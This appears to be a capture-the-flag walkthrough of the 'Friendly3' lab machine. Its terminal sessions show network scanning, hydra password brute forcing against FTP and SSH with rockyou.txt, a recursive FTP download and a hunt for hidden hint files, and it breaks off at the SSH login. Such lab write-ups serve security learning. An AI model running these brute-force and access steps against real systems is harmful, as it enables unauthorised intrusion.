Friendly3 Writeups 

<img width="670" height="77" alt="image" src="https://github.com/user-attachments/assets/38fe9b79-b107-41f6-a0d0-016faca21e00" />

We create the directory of Friendly3 in our Desktop 

┌──(clandhacker㉿kali)-[~/Desktop]
└─$ mkdir Friendly3 
                                                                                                                                                           
┌──(clandhacker㉿kali)-[~/Desktop]
└─$ ls
Archivos  Documentos  Friendly1  Friendly3  Pyphisher  Screenshots  Tools        Youhavebeenhacked
B2E       folder      Friendly2  Payloads   RED_HAWK   sherlock     tor-browser
                                                                                                                                                           
┌──(clandhacker㉿kali)-[~/Desktop]
└─$ cd Friendly3
                                                                                                                                                           
┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]
└─$ 

**Reconaissance**


Now we need to check our target IP Address 

┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]
└─$ sudo arp-scan -I eth0 --localnet                                         
[sudo] password for clandhacker: 
Interface: eth0, 
192.168.15.10   08:00:27:b8:6f:6a       PCS Systemtechnik GmbH

We confirm the Ping command to see what OS we will be working on

┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]
└─$ ping 192.168.15.10           
PING 192.168.15.10 (192.168.15.10) 56(84) bytes of data.
64 bytes from 192.168.15.10: icmp_seq=1 ttl=64 time=3.16 ms
64 bytes from 192.168.15.10: icmp_seq=2 ttl=64 time=1.31 ms
64 bytes from 192.168.15.10: icmp_seq=3 ttl=64 time=2.13 ms

This is a Linux computer TTL showing 64 

We run our Nmap command 

┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]
└─$ nmap -p- --open -sS -sC -sV  -min-rate 5000 -n -Pn -vvv 192.168.15.10 -oN results.txt
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-19 19:47 -0500
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
Initiating ARP Ping Scan at 19:47
Scanning 192.168.15.10 [1 port]
Completed ARP Ping Scan at 19:47, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:47
Scanning 192.168.15.10 [65535 ports]
SYN Stealth Scan Timing: About 50.00% done; ETC: 19:48 (0:00:36 remaining)
Discovered open port 22/tcp on 192.168.15.10
Discovered open port 21/tcp on 192.168.15.10
Discovered open port 80/tcp on 192.168.15.10
Completed SYN Stealth Scan at 19:48, 76.23s elapsed (65535 total ports)
Initiating Service scan at 19:48
Scanning 3 services on 192.168.15.10
Completed Service scan at 19:48, 6.11s elapsed (3 services on 1 host)
NSE: Script scanning 192.168.15.10.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:48
Completed NSE at 19:48, 3.30s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:48
Completed NSE at 19:48, 0.11s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:48
Completed NSE at 19:48, 0.00s elapsed
Nmap scan report for 192.168.15.10
Host is up, received arp-response (0.00080s latency).
Scanned at 2026-09-19 19:47:27 CDT for 86s
Not shown: 53055 filtered tcp ports (no-response), 12477 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 bc:46:3d:85:18:bf:c7:bb:14:26:9a:20:6c:d3:39:52 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFC2DVBfq6sqSsCS9Jg+TZN7bqZ4U5G/tKb5dD3M69VVHwPRuMmify8CmxFhlP33nMhZTvYSZIpjGuiPSjks5UA=
|   256 7b:13:5a:46:a5:62:33:09:24:9d:3e:67:b6:eb:3f:a1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICDxFT3mwConXgCXORTtuda6Onx3sMQgZb6CzY2tWc3l
80/tcp open  http    syn-ack ttl 64 nginx 1.22.1
|_http-server-header: nginx/1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Welcome to nginx!
MAC Address: 08:00:27:B8:6F:6A (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:48
Completed NSE at 19:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:48
Completed NSE at 19:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:48
Completed NSE at 19:48, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.43 seconds
           Raw packets sent: 124833 (5.493MB) | Rcvd: 12483 (499.328KB)

We hae open 21, 22, 80 we are going to see what contains the website in the port 80 TCP 

<img width="1359" height="310" alt="image" src="https://github.com/user-attachments/assets/a8936a8d-05ab-4a2f-9dd5-4e40b5b80f53" />


**Vulnerabilities**

I tried to login using ftp anonymous but it did´t work

┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]
└─$ ftp 192.168.15.10
Connected to 192.168.15.10.
220 (vsFTPd 3.0.3)
Name (192.168.15.10:clandhacker): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
zsh: suspended  ftp 192.168.15.10

So we need to complete a bruteforce attack using **hydra** with Juan user 

comamnd

 ┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]

 
└─$ hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://192.168.15.10 
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-19 20:11:15
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://192.168.15.10:21/
[21][ftp] host: 192.168.15.10   login: juan   password: alexis
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-19 20:11:55

Now we can access to the ftp as juan with a password alexis

┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]

└─$ ftp 192.168.15.10
Connected to 192.168.15.10.
220 (vsFTPd 3.0.3)
Name (192.168.15.10:clandhacker): juan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

We are going to download everything from this machine using a command wget  with this command you download everything files and directories

┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]
└─$ wget -r ftp://"juan":"alexis"@192.168.15.10/                                              
--2026-09-19 20:24:10--  ftp://juan:*password*@192.168.15.10/
           => ‘192.168.15.10/.listing’
Connecting to 192.168.15.10:21... connected.
Logging in as juan ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... done.    ==> LIST ... done.

if we do a LS we can see that we have a directory with the ip address

┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]

└─$ ls
192.168.15.10  results.txt

┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]
└─$ cd 192.168.15.10
                                                                                                                                                           
┌──(clandhacker㉿kali)-[~/Desktop/Friendly3/192.168.15.10]
└─$ ls
file1    file14  file2   file25  file30  file36  file41  file47  file52  file58  file63  file69  file74  file8   file85  file90  file96  fold12  fold6
file10   file15  file20  file26  file31  file37  file42  file48  file53  file59  file64  file7   file75  file80  file86  file91  file97  fold13  fold7
file100  file16  file21  file27  file32  file38  file43  file49  file54  file6   file65  file70  file76  file81  file87  file92  file98  fold14  fold8
file11   file17  file22  file28  file33  file39  file44  file5   file55  file60  file66  file71  file77  file82  file88  file93  file99  fold15  fold9
file12   file18  file23  file29  file34  file4   file45  file50  file56  file61  file67  file72  file78  file83  file89  file94  fold10  fold4   fole32
file13   file19  file24  file3   file35  file40  file46  file51  file57  file62  file68  file73  file79  file84  file9   file95  fold11  fold5
                                                                                                                                           We are going to check all of those with a simple comamnd ls -l to see the files who have some waight 
                                                                                                                                           
     ┌──(clandhacker㉿kali)-[~/Desktop/Friendly3/192.168.15.10]
└─$ ls -l
total 56
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file1
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file10
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file100
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file11
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file12
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file13
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file14
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file15
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file16
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file17
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file18
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file19
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file2
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file20
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file21
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file22
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file23
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file24
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file25
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file26
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file27
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file28
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file29
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file3
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file30
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file31
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file32
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file33
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file34
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file35
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file36
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file37
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file38
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file39
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file4
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file40
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file41
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file42
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file43
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file44
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file45
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file46
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file47
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file48
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file49
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file5
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file50
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file51
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file52
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file53
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file54
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file55
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file56
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file57
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file58
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file59
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file6
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file60
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file61
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file62
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file63
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file64
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file65
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file66
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file67
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file68
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file69
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file7
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file70
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file71
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file72
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file73
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file74
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file75
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file76
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file77
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file78
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file79
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file8
-rw-rw-r-- 1 clandhacker clandhacker   36 Jun 25  2023 file80
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file81
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file82
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file83
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file84
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file85
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file86
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file87
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file88
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file89
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file9
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file90
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file91
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file92
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file93
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file94
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file95
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file96
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file97
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file98
-rw-rw-r-- 1 clandhacker clandhacker    0 Jun 25  2023 file99
drwxrwxr-x 2 clandhacker clandhacker 4096 Sep 19 20:24 fold10
drwxrwxr-x 2 clandhacker clandhacker 4096 Sep 19 20:24 fold11
drwxrwxr-x 2 clandhacker clandhacker 4096 Sep 19 20:24 fold12
drwxrwxr-x 2 clandhacker clandhacker 4096 Sep 19 20:24 fold13
drwxrwxr-x 2 clandhacker clandhacker 4096 Sep 19 20:24 fold14
drwxrwxr-x 2 clandhacker clandhacker 4096 Sep 19 20:24 fold15
drwxrwxr-x 2 clandhacker clandhacker 4096 Sep 19 20:24 fold4
drwxrwxr-x 2 clandhacker clandhacker 4096 Sep 19 20:24 fold5
drwxrwxr-x 2 clandhacker clandhacker 4096 Sep 19 20:24 fold6
drwxrwxr-x 2 clandhacker clandhacker 4096 Sep 19 20:24 fold7
drwxrwxr-x 2 clandhacker clandhacker 4096 Sep 19 20:24 fold8
drwxrwxr-x 2 clandhacker clandhacker 4096 Sep 19 20:24 fold9
-rw-rw-r-- 1 clandhacker clandhacker   58 Jun 25  2023 fole32
                                                                                                                                                           
┌──(clandhacker㉿kali)-[~/Desktop/Friendly3/192.168.15.10]
└─$ cat file80 
Hi, I'm the sysadmin. I am bored...
                                                                                                                                                           
┌──(clandhacker㉿kali)-[~/Desktop/Friendly3/192.168.15.10]
└─$ cat fole32
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabba
                                                                                                                                          
So far we did not find anything on these files or directories the only ones who have something we file80 and fole32 

Now we are going to run a tree command 
                                                                                                                                           ┌──(clandhacker㉿kali)-[~/Desktop/Friendly3/192.168.15.10]
└─$ tree                               
.
├── file1
├── file10
├── file100
├── file11
├── file12
├── file13
├── file14
├── file15
├── file16
├── file17
├── file18
├── file19
├── file2
├── file20
├── file21
├── file22
├── file23
├── file24
├── file25
├── file26
├── file27
├── file28
├── file29
├── file3
├── file30
├── file31
├── file32
├── file33
├── file34
├── file35
├── file36
├── file37
├── file38
├── file39
├── file4
├── file40
├── file41
├── file42
├── file43
├── file44
├── file45
├── file46
├── file47
├── file48
├── file49
├── file5
├── file50
├── file51
├── file52
├── file53
├── file54
├── file55
├── file56
├── file57
├── file58
├── file59
├── file6
├── file60
├── file61
├── file62
├── file63
├── file64
├── file65
├── file66
├── file67
├── file68
├── file69
├── file7
├── file70
├── file71
├── file72
├── file73
├── file74
├── file75
├── file76
├── file77
├── file78
├── file79
├── file8
├── file80
├── file81
├── file82
├── file83
├── file84
├── file85
├── file86
├── file87
├── file88
├── file89
├── file9
├── file90
├── file91
├── file92
├── file93
├── file94
├── file95
├── file96
├── file97
├── file98
├── file99
├── fold10
├── fold11
├── fold12
├── fold13
├── fold14
├── fold15
├── fold4
├── fold5
│   └── yt.txt
├── fold6
├── fold7
├── fold8
│   └── passwd.txt
├── fold9
└── fole32

13 directories, 103 files

From here we have 
                                                                                                                                           ┌──(clandhacker㉿kali)-[~/Desktop/Friendly3/192.168.15.10]
└─$ cd fold5        
                                                                                                                                                           
┌──(clandhacker㉿kali)-[~/Desktop/Friendly3/192.168.15.10/fold5]
└─$ ls   
yt.txt
                                                                                                                                                           
┌──(clandhacker㉿kali)-[~/Desktop/Friendly3/192.168.15.10/fold5]
└─$ cat yt.txt
Thanks to all my YT subscribers!
                                                                                                                                                           
┌──(clandhacker㉿kali)-[~/Desktop/Friendly3/192.168.15.10/fold5]
└─$ cd ..     
                                                                                                                                                           
┌──(clandhacker㉿kali)-[~/Desktop/Friendly3/192.168.15.10]
└─$ cat fold8 
cat: fold8: Is a directory
                                                                                                                                                           
┌──(clandhacker㉿kali)-[~/Desktop/Friendly3/192.168.15.10]
└─$ cd fold8 
                                                                                                                                                           
┌──(clandhacker㉿kali)-[~/Desktop/Friendly3/192.168.15.10/fold8]
└─$ ls
passwd.txt
                                                                                                                                                           
┌──(clandhacker㉿kali)-[~/Desktop/Friendly3/192.168.15.10/fold8]
└─$ cat passwd.txt
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⠛⠛⠛⠿⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⡀⠠⠤⠒⢂⣉⣉⣉⣑⣒⣒⠒⠒⠒⠒⠒⠒⠒⠀⠀⠐⠒⠚⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⡠⠔⠉⣀⠔⠒⠉⣀⣀⠀⠀⠀⣀⡀⠈⠉⠑⠒⠒⠒⠒⠒⠈⠉⠉⠉⠁⠂⠀⠈⠙⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠔⠁⠠⠖⠡⠔⠊⠀⠀⠀⠀⠀⠀⠀⠐⡄⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠉⠲⢄⠀⠀⠀⠈⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠊⠀⢀⣀⣤⣤⣤⣤⣀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠜⠀⠀⠀⠀⣀⡀⠀⠈⠃⠀⠀⠀⠸⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠥⠐⠂⠀⠀⠀⠀⡄⠀⠰⢺⣿⣿⣿⣿⣿⣟⠀⠈⠐⢤⠀⠀⠀⠀⠀⠀⢀⣠⣶⣾⣯⠀⠀⠉⠂⠀⠠⠤⢄⣀⠙⢿⣿⣿
⣿⡿⠋⠡⠐⠈⣉⠭⠤⠤⢄⡀⠈⠀⠈⠁⠉⠁⡠⠀⠀⠀⠉⠐⠠⠔⠀⠀⠀⠀⠀⠲⣿⠿⠛⠛⠓⠒⠂⠀⠀⠀⠀⠀⠀⠠⡉⢢⠙⣿
⣿⠀⢀⠁⠀⠊⠀⠀⠀⠀⠀⠈⠁⠒⠂⠀⠒⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⢀⣀⡠⠔⠒⠒⠂⠀⠈⠀⡇⣿
⣿⠀⢸⠀⠀⠀⢀⣀⡠⠋⠓⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠈⠢⠤⡀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⡠⠀⡇⣿
⣿⡀⠘⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠈⠑⡦⢄⣀⠀⠀⠐⠒⠁⢸⠀⠀⠠⠒⠄⠀⠀⠀⠀⠀⢀⠇⠀⣀⡀⠀⠀⢀⢾⡆⠀⠈⡀⠎⣸⣿
⣿⣿⣄⡈⠢⠀⠀⠀⠀⠘⣶⣄⡀⠀⠀⡇⠀⠀⠈⠉⠒⠢⡤⣀⡀⠀⠀⠀⠀⠀⠐⠦⠤⠒⠁⠀⠀⠀⠀⣀⢴⠁⠀⢷⠀⠀⠀⢰⣿⣿
⣿⣿⣿⣿⣇⠂⠀⠀⠀⠀⠈⢂⠀⠈⠹⡧⣀⠀⠀⠀⠀⠀⡇⠀⠀⠉⠉⠉⢱⠒⠒⠒⠒⢖⠒⠒⠂⠙⠏⠀⠘⡀⠀⢸⠀⠀⠀⣿⣿⣿
⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠑⠄⠰⠀⠀⠁⠐⠲⣤⣴⣄⡀⠀⠀⠀⠀⢸⠀⠀⠀⠀⢸⠀⠀⠀⠀⢠⠀⣠⣷⣶⣿⠀⠀⢰⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠁⢀⠀⠀⠀⠀⠀⡙⠋⠙⠓⠲⢤⣤⣷⣤⣤⣤⣤⣾⣦⣤⣤⣶⣿⣿⣿⣿⡟⢹⠀⠀⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠑⠀⢄⠀⡰⠁⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠻⠋⠉⠛⢛⠉⠉⢹⠁⢀⢇⠎⠀⠀⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠈⠢⢄⡉⠂⠄⡀⠀⠈⠒⠢⠄⠀⢀⣀⣀⣰⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⢀⣎⠀⠼⠊⠀⠀⠀⠘⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠉⠢⢄⡈⠑⠢⢄⡀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⢀⠀⠀⠀⠀⠀⢻⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⡈⠑⠢⢄⡀⠈⠑⠒⠤⠄⣀⣀⠀⠉⠉⠉⠉⠀⠀⠀⣀⡀⠤⠂⠁⠀⢀⠆⠀⠀⢸⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀⠁⠉⠒⠂⠤⠤⣀⣀⣉⡉⠉⠉⠉⠉⢀⣀⣀⡠⠤⠒⠈⠀⠀⠀⠀⣸⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣤⣤⣤⣤⣀⣀⣤⣤⣤⣶⣾⣿⣿⣿⣿⣿


we are going to see if there are hidden files using the tree command

┌──(clandhacker㉿kali)-[~/Desktop/Friendly3/192.168.15.10]
└─$ tree -a .
.
├── file1
├── file10
├── file100
├── file11
├── file12
├── file13
├── file14
├── file15
├── file16
├── file17
├── file18
├── file19
├── file2
├── file20
├── file21
├── file22
├── file23
├── file24
├── file25
├── file26
├── file27
├── file28
├── file29
├── file3
├── file30
├── file31
├── file32
├── file33
├── file34
├── file35
├── file36
├── file37
├── file38
├── file39
├── file4
├── file40
├── file41
├── file42
├── file43
├── file44
├── file45
├── file46
├── file47
├── file48
├── file49
├── file5
├── file50
├── file51
├── file52
├── file53
├── file54
├── file55
├── file56
├── file57
├── file58
├── file59
├── file6
├── file60
├── file61
├── file62
├── file63
├── file64
├── file65
├── file66
├── file67
├── file68
├── file69
├── file7
├── file70
├── file71
├── file72
├── file73
├── file74
├── file75
├── file76
├── file77
├── file78
├── file79
├── file8
├── file80
├── file81
├── file82
├── file83
├── file84
├── file85
├── file86
├── file87
├── file88
├── file89
├── file9
├── file90
├── file91
├── file92
├── file93
├── file94
├── file95
├── file96
├── file97
├── file98
├── file99
├── fold10
│   └── .test.txt
├── fold11
├── fold12
├── fold13
├── fold14
├── fold15
├── fold4
├── fold5
│   └── yt.txt
├── fold6
├── fold7
├── fold8
│   └── passwd.txt
├── fold9
└── fole32

13 directories, 104 files
                          
We found fold10 .test.txt

┌──(clandhacker㉿kali)-[~/Desktop/Friendly3/192.168.15.10]

└─$ cd fold10
                                                                                                                                                           
┌──(clandhacker㉿kali)-[~/Desktop/Friendly3/192.168.15.10/fold10]

└─$ ls
                                                                                                                                                           
┌──(clandhacker㉿kali)-[~/Desktop/Friendly3/192.168.15.10/fold10]

└─$ cat .test.txt 
Hi, I'am juan another time. I want you to know that I found "cookie" in a file called "zlcnffjbeq.gkg" into my home folder. I think it's from another user, IDK...

We are going to see if we can access with hydra in ssh 

┌──(clandhacker㉿kali)-[~/Desktop/Friendly3/192.168.15.10/fold10]
└─$ hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://192.168.15.10 
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-19 20:43:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.15.10:22/
[22][ssh] host: 192.168.15.10   login: juan   password: alexis
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-19 20:44:17

┌──(clandhacker㉿kali)-[~/Desktop/Friendly3/192.168.15.10/fold10]

└─$ ssh juan@192.168.15.10                        
The authenticity of host '192.168.15.10 (192.168.15.10)' can't be established.
